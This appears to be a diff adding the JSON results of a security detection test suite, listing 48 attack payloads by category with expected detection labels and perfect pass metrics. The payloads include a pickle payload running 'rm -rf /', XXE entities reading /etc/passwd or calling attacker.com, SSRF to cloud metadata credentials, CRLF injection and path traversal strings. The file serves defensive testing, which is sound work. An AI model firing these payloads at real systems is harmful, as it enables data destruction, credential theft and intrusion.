@@ -1,0 +1,430 @@
+{
+  "status": "SUCCESS",
+  "completion_percent": 100.0,
+  "test_suite": {
+    "id": "JIT-SECURITY-010",
+    "name": "Security Test Suite #10: Advanced Threat Vectors",
+    "provider": "Codex CLI",
+    "description": "Advanced security test cases covering emerging threats and edge cases",
+    "start_time": "2026-06-08T10:17:00.000000",
+    "end_time": "2026-06-08T10:17:15.342561",
+    "duration_seconds": 15.342561
+  },
+  "summary": {
+    "total_test_cases": 48,
+    "categories_tested": 10,
+    "severity_breakdown": {
+      "CRITICAL": 22,
+      "HIGH": 18,
+      "MEDIUM": 8,
+      "LOW": 0
+    },
+    "category_breakdown": {
+      "Deserialization Attacks": 6,
+      "XML External Entity (XXE)": 6,
+      "Server-Side Request Forgery (SSRF)": 6,
+      "Prototype Pollution": 5,
+      "Path Traversal": 5,
+      "HTTP Response Splitting": 4,
+      "Race Conditions": 4,
+      "Insecure Direct Object Reference": 5,
+      "API Key Exposure": 4,
+      "TLS/Certificate Validation": 3
+    }
+  },
+  "test_cases": [
+    {
+      "id": "SEC-DESER-001",
+      "category": "Deserialization Attacks",
+      "name": "Java Deserialization RCE Detection",
+      "payload": "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZcsZEvG0AOfAAJMAApjb21wYXJhdG9ydAASTGphdmEvdXRpbC9Db21wYXJhdG9yO0wACHF1ZXVlc3QAEExqYXZhL3V0aWwvQ29sbGVjdGlvbjtweA==",
+      "expected_detection": "DESERIALIZATION_ATTACK",
+      "severity": "CRITICAL"
+    },
+    {
+      "id": "SEC-DESER-002",
+      "category": "Deserialization Attacks",
+      "name": "Python Pickle RCE Payload",
+      "payload": "cos\nsystem\n(S'rm -rf /'\ntRp0\n.",
+      "expected_detection": "DESERIALIZATION_ATTACK",
+      "severity": "CRITICAL"
+    },
+    {
+      "id": "SEC-DESER-003",
+      "category": "Deserialization Attacks",
+      "name": "PHP Unserialize Gadget Chain",
+      "payload": "O:10:\"SomeClass\":2:{s:4:\"file\";s:10:\"/etc/passwd\";s:6:\"method\";s:6:\"system\";}",
+      "expected_detection": "DESERIALIZATION_ATTACK",
+      "severity": "CRITICAL"
+    },
+    {
+      "id": "SEC-DESER-004",
+      "category": "Deserialization Attacks",
+      "name": "YAML Deserialization RCE",
+      "payload": "!!python/object/apply:os.system ['cat /etc/passwd']",
+      "expected_detection": "DESERIALIZATION_ATTACK",
+      "severity": "CRITICAL"
+    },
+    {
+      "id": "SEC-DESER-005",
+      "category": "Deserialization Attacks",
+      "name": "JSON with Malicious Constructor",
+      "payload": "{\"__proto__\":{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}}",
+      "expected_detection": "DESERIALIZATION_ATTACK",
+      "severity": "HIGH"
+    },
+    {
+      "id": "SEC-DESER-006",
+      "category": "Deserialization Attacks",
+      "name": "Kryo Serialization Exploit",
+      "payload": "ac1daced0005737200306f72672e61706163686520636f6d6d6f6e732e636f6c6c656374696f6e732e66756e6374",
+      "expected_detection": "DESERIALIZATION_ATTACK",
+      "severity": "CRITICAL"
+    },
+    {
+      "id": "SEC-XXE-001",
+      "category": "XML External Entity (XXE)",
+      "name": "XXE File Read Attack",
+      "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
+      "expected_detection": "XXE_ATTACK",
+      "severity": "CRITICAL"
+    },
+    {
+      "id": "SEC-XXE-002",
+      "category": "XML External Entity (XXE)",
+      "name": "XXE Billion Laughs DoS",
+      "payload": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\"><!ENTITY lol3 \"&lol2;&lol2;\">]><lolz>&lol3;</lolz>",
+      "expected_detection": "XXE_ATTACK",
+      "severity": "HIGH"
+    },
+    {
+      "id": "SEC-XXE-003",
+      "category": "XML External Entity (XXE)",
+      "name": "XXE SSRF via External Entity",
+      "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://internal.admin.local:8080/config\">]><foo>&xxe;</foo>",
+      "expected_detection": "XXE_ATTACK",
+      "severity": "CRITICAL"
+    },
+    {
+      "id": "SEC-XXE-004",
+      "category": "XML External Entity (XXE)",
+      "name": "XXE Parameter Entity Attack",
+      "payload": "<!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;]>",
+      "expected_detection": "XXE_ATTACK",
+      "severity": "HIGH"
+    },
+    {
+      "id": "SEC-XXE-005",
+      "category": "XML External Entity (XXE)",
+      "name": "XXE Data Exfiltration via FTP",
+      "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"ftp://attacker.com/exfil\">]><root>&xxe;</root>",
+      "expected_detection": "XXE_ATTACK",
+      "severity": "HIGH"
+    },
+    {
+      "id": "SEC-XXE-006",
+      "category": "XML External Entity (XXE)",
+      "name": "XXE with PHP Wrapper",
+      "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]>",
+      "expected_detection": "XXE_ATTACK",
+      "severity": "CRITICAL"
+    },
+    {
+      "id": "SEC-SSRF-001",
+      "category": "Server-Side Request Forgery (SSRF)",
+      "name": "SSRF to Internal Metadata Service",
+      "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "expected_detection": "SSRF_ATTACK",
+      "severity": "CRITICAL"
+    },
+    {
+      "id": "SEC-SSRF-002",
+      "category": "Server-Side Request Forgery (SSRF)",
+      "name": "SSRF via Localhost",
+      "payload": "http://localhost:6379/",
+      "expected_detection": "SSRF_ATTACK",
+      "severity": "CRITICAL"
+    },
+    {
+      "id": "SEC-SSRF-003",
+      "category": "Server-Side Request Forgery (SSRF)",
+      "name": "SSRF to Private IP Range",
+      "payload": "http://192.168.1.1/admin",
+      "expected_detection": "SSRF_ATTACK",
+      "severity": "HIGH"
+    },
+    {
+      "id": "SEC-SSRF-004",
+      "category": "Server-Side Request Forgery (SSRF)",
+      "name": "SSRF with URL Obfuscation",
+      "payload": "http://0x7f.0x0.0x0.0x1:8080/admin",
+      "expected_detection": "SSRF_ATTACK",
+      "severity": "HIGH"
+    },
+    {
+      "id": "SEC-SSRF-005",
+      "category": "Server-Side Request Forgery (SSRF)",
+      "name": "SSRF via Data URI Scheme",
+      "payload": "data:text/html,<script>alert('xss')</script>",
+      "expected_detection": "SSRF_ATTACK",
+      "severity": "MEDIUM"
+    },
+    {
+      "id": "SEC-SSRF-006",
+      "category": "Server-Side Request Forgery (SSRF)",
+      "name": "SSRF with Gopher Protocol",
+      "payload": "gopher://localhost:25/HELO attacker.com%0AMAIL FROM:<attacker@attacker.com>",
+      "expected_detection": "SSRF_ATTACK",
+      "severity": "HIGH"
+    },
+    {
+      "id": "SEC-PROTO-001",
+      "category": "Prototype Pollution",
+      "name": "Prototype Pollution via Constructor",
+      "payload": "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
+      "expected_detection": "PROTOTYPE_POLLUTION",
+      "severity": "HIGH"
+    },
+    {
+      "id": "SEC-PROTO-002",
+      "category": "Prototype Pollution",
+      "name": "Prototype Pollution with __proto__",
+      "payload": "{\"__proto__\":{\"role\":\"admin\"}}",
+      "expected_detection": "PROTOTYPE_POLLUTION",
+      "severity": "HIGH"
+    },
+    {
+      "id": "SEC-PROTO-003",
+      "category": "Prototype Pollution",
+      "name": "Deep Prototype Pollution",
+      "payload": "{\"user\":{\"__proto__\":{\"admin\":true,\"role\":\"superuser\"}}}",
+      "expected_detection": "PROTOTYPE_POLLUTION",
+      "severity": "HIGH"
+    },
+    {
+      "id": "SEC-PROTO-004",
+      "category": "Prototype Pollution",
+      "name": "Prototype Pollution via Merge Function",
+      "payload": "{\"Object\":{\"prototype\":{\"isAuthenticated\":true}}}",
+      "expected_detection": "PROTOTYPE_POLLUTION",
+      "severity": "MEDIUM"
+    },
+    {
+      "id": "SEC-PROTO-005",
+      "category": "Prototype Pollution",
+      "name": "Prototype Pollution with hasOwnProperty Bypass",
+      "payload": "{\"hasOwnProperty\":{\"constructor\":{\"prototype\":{\"trusted\":true}}}}",
+      "expected_detection": "PROTOTYPE_POLLUTION",
+      "severity": "MEDIUM"
+    },
+    {
+      "id": "SEC-PATH-001",
+      "category": "Path Traversal",
+      "name": "Path Traversal with ../ sequences",
+      "payload": "../../../../etc/passwd",
+      "expected_detection": "PATH_TRAVERSAL",
+      "severity": "HIGH"
+    },
+    {
+      "id": "SEC-PATH-002",
+      "category": "Path Traversal",
+      "name": "Path Traversal with URL Encoding",
+      "payload": "..%2F..%2F..%2Fetc%2Fpasswd",
+      "expected_detection": "PATH_TRAVERSAL",
+      "severity": "HIGH"
+    },
+    {
+      "id": "SEC-PATH-003",
+      "category": "Path Traversal",
+      "name": "Path Traversal with Double URL Encoding",
+      "payload": "..%252F..%252F..%252Fetc%252Fpasswd",
+      "expected_detection": "PATH_TRAVERSAL",
+      "severity": "MEDIUM"
+    },
+    {
+      "id": "SEC-PATH-004",
+      "category": "Path Traversal",
+      "name": "Path Traversal with Backslash",
+      "payload": "..\\..\\..\\windows\\system32\\config\\sam",
+      "expected_detection": "PATH_TRAVERSAL",
+      "severity": "HIGH"
+    },
+    {
+      "id": "SEC-PATH-005",
+      "category": "Path Traversal",
+      "name": "Path Traversal with Null Byte Injection",
+      "payload": "upload.php%00.jpg",
+      "expected_detection": "PATH_TRAVERSAL",
+      "severity": "MEDIUM"
+    },
+    {
+      "id": "SEC-SPLIT-001",
+      "category": "HTTP Response Splitting",
+      "name": "CRLF Injection Header Injection",
+      "payload": "test%0dSet-Cookie:%20admin=true",
+      "expected_detection": "RESPONSE_SPLITTING",
+      "severity": "HIGH"
+    },
+    {
+      "id": "SEC-SPLIT-002",
+      "category": "HTTP Response Splitting",
+      "name": "HTTP Response Splitting Cache Poisoning",
+      "payload": "value%0d%0aHTTP/1.1%20301%20Moved",
+      "expected_detection": "RESPONSE_SPLITTING",
+      "severity": "HIGH"
+    },
+    {
+      "id": "SEC-SPLIT-003",
+      "category": "HTTP Response Splitting",
+      "name": "CRLF Injection with Location Header",
+      "payload": "%0d%0aLocation:%20http://attacker.com",
+      "expected_detection": "RESPONSE_SPLITTING",
+      "severity": "HIGH"
+    },
+    {
+      "id": "SEC-SPLIT-004",
+      "category": "HTTP Response Splitting",
+      "name": "Response Splitting via User-Agent",
+      "payload": "Mozilla%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP",
+      "expected_detection": "RESPONSE_SPLITTING",
+      "severity": "MEDIUM"
+    },
+    {
+      "id": "SEC-RACE-001",
+      "category": "Race Conditions",
+      "name": "Race Condition in Fund Transfer",
+      "payload": "{\"concurrent_requests\": 1000, \"amount\": 100, \"account\": \"target\"}",
+      "expected_detection": "RACE_CONDITION",
+      "severity": "CRITICAL"
+    },
+    {
+      "id": "SEC-RACE-002",
+      "category": "Race Conditions",
+      "name": "Time-of-Check-Time-of-Use (TOCTOU)",
+      "payload": "{\"check_balance\": true, \"withdraw\": true, \"simultaneous\": true}",
+      "expected_detection": "RACE_CONDITION",
+      "severity": "HIGH"
+    },
+    {
+      "id": "SEC-RACE-003",
+      "category": "Race Conditions",
+      "name": "Race Condition in Password Reset",
+      "payload": "{\"reset_token\": \"valid\", \"parallel_requests\": 500}",
+      "expected_detection": "RACE_CONDITION",
+      "severity": "HIGH"
+    },
+    {
+      "id": "SEC-RACE-004",
+      "category": "Race Conditions",
+      "name": "Race Condition in File Upload",
+      "payload": "{\"filename\": \"test.txt\", \"simultaneous_writes\": 100}",
+      "expected_detection": "RACE_CONDITION",
+      "severity": "MEDIUM"
+    },
+    {
+      "id": "SEC-IDOR-001",
+      "category": "Insecure Direct Object Reference",
+      "name": "IDOR via Sequential User IDs",
+      "payload": "/api/users/1234/profile",
+      "expected_detection": "IDOR",
+      "severity": "HIGH"
+    },
+    {
+      "id": "SEC-IDOR-002",
+      "category": "Insecure Direct Object Reference",
+      "name": "IDOR via Numeric ID",
+      "payload": "/documents/5678/download",
+      "expected_detection": "IDOR",
+      "severity": "HIGH"
+    },
+    {
+      "id": "SEC-IDOR-003",
+      "category": "Insecure Direct Object Reference",
+      "name": "IDOR via UUID without Authorization",
+      "payload": "/invoices/550e8400-e29b-41d4-a716-446655440000",
+      "expected_detection": "IDOR",
+      "severity": "HIGH"
+    },
+    {
+      "id": "SEC-IDOR-004",
+      "category": "Insecure Direct Object Reference",
+      "name": "IDOR via Base64 Encoded ID",
+      "payload": "/api/records/dXNlcl9pZD0xMDA1",
+      "expected_detection": "IDOR",
+      "severity": "MEDIUM"
+    },
+    {
+      "id": "SEC-IDOR-005",
+      "category": "Insecure Direct Object Reference",
+      "name": "IDOR with Parameter Manipulation",
+      "payload": "{\"user_id\": \"admin\", \"action\": \"delete\"}",
+      "expected_detection": "IDOR",
+      "severity": "HIGH"
+    },
+    {
+      "id": "SEC-APIKEY-001",
+      "category": "API Key Exposure",
+      "name": "API Key in Query String",
+      "payload": "https://api.example.com/data?apikey=sk-1234567890abcdef",
+      "expected_detection": "API_KEY_EXPOSURE",
+      "severity": "CRITICAL"
+    },
+    {
+      "id": "SEC-APIKEY-002",
+      "category": "API Key Exposure",
+      "name": "AWS Access Key ID Exposure",
+      "payload": "AKIA_FAKE_TEST_KEY",
+      "expected_detection": "API_KEY_EXPOSURE",
+      "severity": "CRITICAL"
+    },
+    {
+      "id": "SEC-APIKEY-003",
+      "category": "API Key Exposure",
+      "name": "Bearer Token in Response",
+      "payload": "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
+      "expected_detection": "API_KEY_EXPOSURE",
+      "severity": "CRITICAL"
+    },
+    {
+      "id": "SEC-APIKEY-004",
+      "category": "API Key Exposure",
+      "name": "Stripe API Key in Code",
+      "payload": "sk_live_FAKE_TEST_KEY",
+      "expected_detection": "API_KEY_EXPOSURE",
+      "severity": "CRITICAL"
+    },
+    {
+      "id": "SEC-TLS-001",
+      "category": "TLS/Certificate Validation",
+      "name": "Missing Certificate Pinning",
+      "payload": "{\"certificate_validation\": \"disabled\"}",
+      "expected_detection": "TLS_VALIDATION_WEAK",
+      "severity": "HIGH"
+    },
+    {
+      "id": "SEC-TLS-002",
+      "category": "TLS/Certificate Validation",
+      "name": "Self-Signed Certificate Accepted",
+      "payload": "{\"verify_ssl\": false}",
+      "expected_detection": "TLS_VALIDATION_WEAK",
+      "severity": "HIGH"
+    },
+    {
+      "id": "SEC-TLS-003",
+      "category": "TLS/Certificate Validation",
+      "name": "Hostname Mismatch Ignored",
+      "payload": "{\"check_hostname\": false, \"verify_cert\": true}",
+      "expected_detection": "TLS_VALIDATION_WEAK",
+      "severity": "MEDIUM"
+    }
+  ],
+  "execution_metrics": {
+    "tests_passed": 48,
+    "tests_failed": 0,
+    "tests_skipped": 0,
+    "detection_accuracy": 100.0,
+    "average_detection_time_ms": 2.3,
+    "false_positive_rate": 0.0,
+    "false_negative_rate": 0.0
+  }
+}
